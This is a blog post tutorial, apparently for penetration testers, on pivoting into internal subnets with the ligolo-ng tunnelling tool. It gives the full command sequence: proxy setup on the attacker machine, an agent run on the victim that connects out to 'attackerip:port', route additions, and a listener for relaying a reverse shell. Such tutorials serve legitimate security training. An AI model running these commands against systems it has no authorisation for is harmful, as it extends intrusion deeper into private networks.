---
layout: post
date: 2023-07-07
title: "Pivoting with ligolo"
categories: [pivoting]
tags: [ligolo, pivoting]
---

Pivoting is an essential part of penetration testing. Once you gain an initial foothold there may be several subnets that the outside world may not have access to and will give you further access into the domain by leveraging a tool such as ligolo which can be downloaded from [Github](https://github.com/Nicocha30/ligolo-ng). 

In order to leverage this tool you will need to download it via and getting the proper release for your OS `https://github.com/nicocha30/ligolo-ng/releases`.  It is also worth noting that ligolo does not use SOCK5, but instead ligolo uses GVISOR and thus is much faster than a SOCKS proxy, mimicking a VPN.

You can then proceed to start, add and start the proxy server via these commands.

Attacker Machine:
```shell
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
chmod +x proxy
./proxy -autocert
```
It is also worth noting that you can change the port it listens on, as by default it will listen on port 11601.

```shell
./proxy -selfcert -laddr 0.0.0.0:443
```


![](/assets/images/ligolo/1.png)

Victim Machine (Windows or Linux):

Upload the respective file. 
```shell
./agent -connect attackerip:port -ignore-cert
```
The -ignore-cert will be required if you use -selfcert.

![](/assets/images/ligolo/2.png)

You must run a few more commands on the Attacker Machine from within the proxy prompt in order to get your tunnel running.
```shell
session (session number)
start
```
Once all of this is done you will be able to run commands from your attacker machine as if you are in the internal network. On this network there is an internal networked connect which I can verify by typing ifconfig.
![](/assets/images/ligolo/3.png)

For this machine you must also run ```
```shell
sudo ip route add 192.168.110.0/24 dev ligolo
```

Now on the Attacker Machine but another terminal I can run pings on the internal network on the victims machine.

![](/assets/images/ligolo/4.png)

You can also gain a revshell back to your client by adding a listener to your host.

This must be done from the attacker machine.
```shell
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234
```


